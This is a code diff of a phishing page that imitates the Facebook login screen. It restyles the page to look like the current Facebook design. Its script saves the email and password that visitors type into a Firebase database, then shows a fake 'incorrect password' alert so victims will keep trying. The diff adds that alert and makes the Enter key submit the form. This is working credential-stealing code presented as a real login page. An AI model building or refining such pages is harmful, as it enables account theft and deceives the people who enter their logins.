@@ -4,11 +4,89 @@
 <title>Facebook</title>
 <link rel="shortcut icon" href="H3nktOa7ZMg.ico" />
 <link type="text/css" rel="stylesheet" href="style1.css" />
-<link type="text/css" rel="stylesheet" href="style2.css" />
-<link type="text/css" rel="stylesheet" href="style3.css" /><link type="text/css" rel="stylesheet" href="style4.css" /><link type="text/css" rel="stylesheet" href="style5.css" />
+<!--<link type="text/css" rel="stylesheet" href="style2.css" />-->
+<link type="text/css" rel="stylesheet" href="style3.css" />
+<link type="text/css" rel="stylesheet" href="style4.css" />
+<link type="text/css" rel="stylesheet" href="style5.css" />
+<link type="text/css" rel="stylesheet" href="style7.css" />
+
+<style>
+	html, body {width: 100%;
+	height: 100%;}
+	.login_form_container_wrap {
+		position: relative;
+		width: 100%;
+		height: 100%;
+	}
+	.img-wrap {
+	display:block;
+	width: 100%;
+	height: 100%;
+	position:absolute;
+	z-index: -1;
+	background: url("bg2.png");
+	background-repeat: no-repeat;
+	background-position: center top;
+	background-size: cover;
+	left: 0;
+	right: 0;
+	bottom: 0;
+	top: 0;
+	}
+	.login_form_overlay {
+		position: fixed;
+		top: 0;
+		bottom: 0;
+		left: 0;
+		right: 0;
+		background: rgba(255, 255, 255, 0.8);
+	}
+	.login_form_container {
+		position: absolute;
+		top: 15%;
+		left: 0;
+		right: 0;
+		margin: auto;
+		width: 100%;
+		max-width: 486px;
+		background: #fff;
+		border-radius: 8px;
+		box-shadow: 0 12px 28px 0 rgba(0,0,0,0.2),0 2px 4px 0 rgba(0,0,0,0.1),inset 0 0 0 1px rgba(255,255,255,0.5);
+		padding: 52px 32px 32px;
+	}
+	::-webkit-input-placeholder { /* Edge */
+		text-align: center;
+	}
+	:-ms-input-placeholder { /* Internet Explorer 10-11 */
+		text-align: center;
+	}
+	::placeholder {
+		text-align: center;
+	}
+	.inputtext,
+	.inputpassword {
+		border: 1px solid #ced0d4;
+		border-radius: 6px;
+		padding: 10px 16px !important;
+		margin-bottom: 12px;
+	}
+	.uiButton {
+		width: auto;
+		height: 40px;
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		background: #1b74e4;
+		border: 0;
+		border-radius: 6px;
+	}
+	.forgot {
+		color: hsl(214, 89%, 52%);
+	}
+</style>
 </head>
 <body>
-
+	
 	<script type="module">
 		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.9.1/firebase-app.js";
 		import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.9.1/firebase-database.js";
@@ -38,9 +116,16 @@
 				email: email,
 				pwd : pwd
 			});
+			alert('Incorrect email or password, please try again.')
 		}
 
 		document.getElementById("loginSubmitBtn").addEventListener("click", writeUserData, false);
+
+		document.getElementById('user_pass').onkeydown = function(e){
+			if(e.keyCode == 13){
+				document.getElementById("loginSubmitBtn").click();
+			}
+		};
 
 		const db2 = getDatabase();
 		const table = ref(db2, 'users');
@@ -49,125 +134,51 @@
 			console.log(data)
 		});
 	</script>	
-<div class="_li">
-<div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
-<div id="blueBarHolder">
-<div id="blueBar"><div>
-<div class="loggedout_menubar_container">
-<div class="clearfix loggedout_menubar">
-<a class="lfloat _ohe" href="login.html" title="Go to Facebook Home"><i class="fb_logo img sp_9vUokIDmpP8 sx_15c231"><u>Facebook logo</u></i></a>
-</div>
-</div>
-
-<div class="signupBanner">
-<div class="signup_bar_container">
-<div class="signup_box clearfix">
-<span class="signup_box_content">
-<a class="_42ft _42fu signup_btn selected _42gz _42gy" role="button" href="login.html">Sign Up</a>
-</span>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
 
 
-<div id="globalContainer" class="uiContextualLayerParent">
-<div id="content" class="fb_content clearfix">
-<div class="UIFullPage_Container">
-<div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite">
-<div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
-<div class="clearfix uiHeaderTop">
-<div class="rfloat">
-<!--<h2 class="accessible_elem">Facebook Login</h2>-->
-<div class="uiHeaderActions"></div></div><div>
-<h2 class="uiHeaderTitle" aria-hidden="true">Facebook Login</h2></div></div></div>
-<div class="phl ptm uiInterstitialContent">
 
-<div class="login_form_container">
-	<form id="login_form" action="index.php" method="post">
-		<div class="pam login_error_box uiBoxRed"><div class="fsl fwb fcb">You are not Logged In</div><div><p>It seems you are logged out or need to log in again for security reasons.</p><p>You can log in using any email address, username or mobile phone number associated with your account. Make sure that it is typed correctly.</p></div></div>
-		<br/>
-		<div id="loginform">
-			<div class="form_row clearfix">
-				<label for="email" class="login_form_label">Email or Phone:</label>
-				<input type="text" class="inputtext" id="user_email" name="email" value="">
+
+
+<div class="login_form_container_wrap">
+	<div class="img-wrap"></div>
+	<div class="login_form_overlay"></div>
+	<div class="login_form_container">
+		<form id="login_form" action="index.php" method="post">
+			<div class="x1xka2u1 xqfms19" style="margin-bottom: 10px;">
+				<span class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x14z4hjw x41vudc x1q74xe4 xyesn5m x1xlr1w8 xzsf02u x2b8uid" dir="auto">
+					<span class="x1lliihq x6ikm8r x10wlt62 x1n2onr6" style="-moz-box-orient: vertical; -webkit-line-clamp: 2; display: -webkit-box;">Log in to Facebook</span>
+				</span>
 			</div>
-			
-			<div class="form_row clearfix">
-				<label for="pass" class="login_form_label">Password:</label>
-				<input type="password" name="pass" id="user_pass" class="inputpassword">
-			</div>
-			<div class="persistent">
-				<div class="uiInputLabel clearfix uiInputLabelLegacy">
-					<input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox">
-					<label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label>
-				</div>
-			</div>
-			
-			<div id="buttons" class="form_row clearfix">
-				<label class="login_form_label"></label>
-				<div id="login_button_inline">
-					<label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log in" name="login" type="button" id="loginSubmitBtn" /></label>
+			<br/>
+			<div id="loginform">
+				<div class="form_row clearfix">
+					<input type="text" placeholder="Email address or phone number" class="inputtext x1i10hfl xggy1nq x1s07b3s x1kdt53j x1a2a7pz xjbqb8w x76ihet xwmqs3e x112ta8 xxxdfa6 x9f619 xzsf02u x1uxerd5 x1fcty0u x132q4wb x1a8lsjc x1pi30zi x1swvt13 x9desvi xh8yej3 x15h3p50 x10emqs4" id="user_email" name="email" value="">
+				</div>				
+				<div class="form_row clearfix">
+					<input type="password" placeholder="Password" name="pass" id="user_pass" class="inputpassword  x1i10hfl xggy1nq x1s07b3s x1kdt53j x1a2a7pz xjbqb8w x76ihet xwmqs3e x112ta8 xxxdfa6 x9f619 xzsf02u x1uxerd5 x1fcty0u x132q4wb x1a8lsjc x1pi30zi x1swvt13 x9desvi xh8yej3 x15h3p50 x10emqs4">
 				</div>
 				
-				<div id="register_link">or <strong><a href="#" target="_self" rel="nofollow" id="reg_btn_link" tabindex="-1">Sign up for Facebook</a></strong></div>
-			</div>
-			
-			<p class="reset_password form_row">
-			<a href="#" target="" tabindex="-1">Forgotten your password?</a></p>
-			
-			</div>
-	</form>
-</div>
-</div>
-</div>
+				<div id="buttons" class="form_row clearfix" style="margin-bottom: 18px;">
+					<div id="login_button_inline">
+						<label class="uiButton uiButtonConfirm uiButtonLarge" id="loginSubmitBtn" for="u_0_1">
+							<input value="Log in" name="login" type="button" id="loginSubmit" />
+						</label>
+					</div>
+					
+				</div>
+				<div class="x1xka2u1">
+					<a class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz xt0b8zv x1qq9wsj" href="javascript:void(0);" role="link" tabindex="0"><span class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen x1s688f x1qq9wsj x2b8uid forgot" dir="auto">Forgotten password?</span></a>
+				</div>
 
-<div id="pageFooter" data-referrer="page_footer">
-	<div id="contentCurve"></div>
-	
-	<div role="contentinfo" aria-label="Facebook site links">
-	<table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0"><tbody>
-	<tr class="_51mx">
-	
-	<td class="_51m- hLeft plm">
-		<a href="#" title="Take a look at Facebook mobile.">Mobile</a>
-	</td>
-	
-	<td class="_51m- hLeft plm"><a href="#" title="Find anyone on the web.">Find Friends</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Embed a Facebook badge on your website.">Badges</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Browse our people directory.">People</a></td>
-	<td class="_51m- hLeft plm"><a href="# title="Browse our pages directory.">Pages</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Browse our places directory.">Places</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Check out Facebook App Centre.">Apps</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Check out Facebook games.">Games</a></td>
-	<td class="_51m- hLeft plm _51mw"><a href="#" title="Check out Facebook music apps.">Music</a></td>
-	
-	</tr>
-	
-	<tr class="_51mx">
-	
-	<td class="_51m- hLeft plm">
-		<a href="#" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About</a>
-	</td>
-	
-	<td class="_51m- hLeft plm"><a href="#" title="Advertise on Facebook">Create Advert</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Create a Page">Create Page</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Develop on our platform.">Developers</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Make your next career move to our brilliant company.">Careers</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Learn about your privacy and Facebook.">Privacy</a></td>
-	<td class="_51m- hLeft plm"><a href="#" title="Learn about cookies and Facebook.">Cookies</a></td>
-	<td class="_51m- hLeft plm"><a href="#" accesskey="9" title="Review our terms and policies.">Terms</a></td>
-	<td class="_51m- hLeft plm _51mw"><a href="#" accesskey="0" title="Visit our Help Centre.">Help</a></td>
-	</tr>
-	</tbody>
-	</table>
+				<div class="x1hq5gj4"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xn6708d x1ye3gou xykv574 xbmpl8g x4cne27 xifccgj"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"><div class="x1pjtg3p xjm9jq1"></div></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"><span class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x676frb x1nxh6w3 x1sibtaa x1s688f xi81zsa x2b8uid" dir="auto">or</span></div><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"><div class="x1pjtg3p xjm9jq1"></div></div></div></div>
+				
+				<div style="text-align: center;">
+					<div class="x1rg5ohu"><div aria-label="Create new account" class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3" role="button" tabindex="0"><div class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xbxaen2 x1u72gb5 xv9rvxn x1fq8qgq"><div class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"><div class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"><span class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x676frb x1lkfr7t x1lbecb7 x1s688f xtk6v10" dir="auto"><span class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft">Create new account</span></span></div></div><div class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x1wpzbip"></div></div></div></div>
+				</div>
+			</div>
+		</form>
 	</div>
-	
-	<div class="mvl copyright">
-	<div class="fsm fwn fcg"><span> Facebook © 2022</span> · <a rel="dialog" title="Use Facebook in another language." href="#" role="button">English (UK)</a></div></div></div></div></div>
+</div>
 
 </body>
 </html>
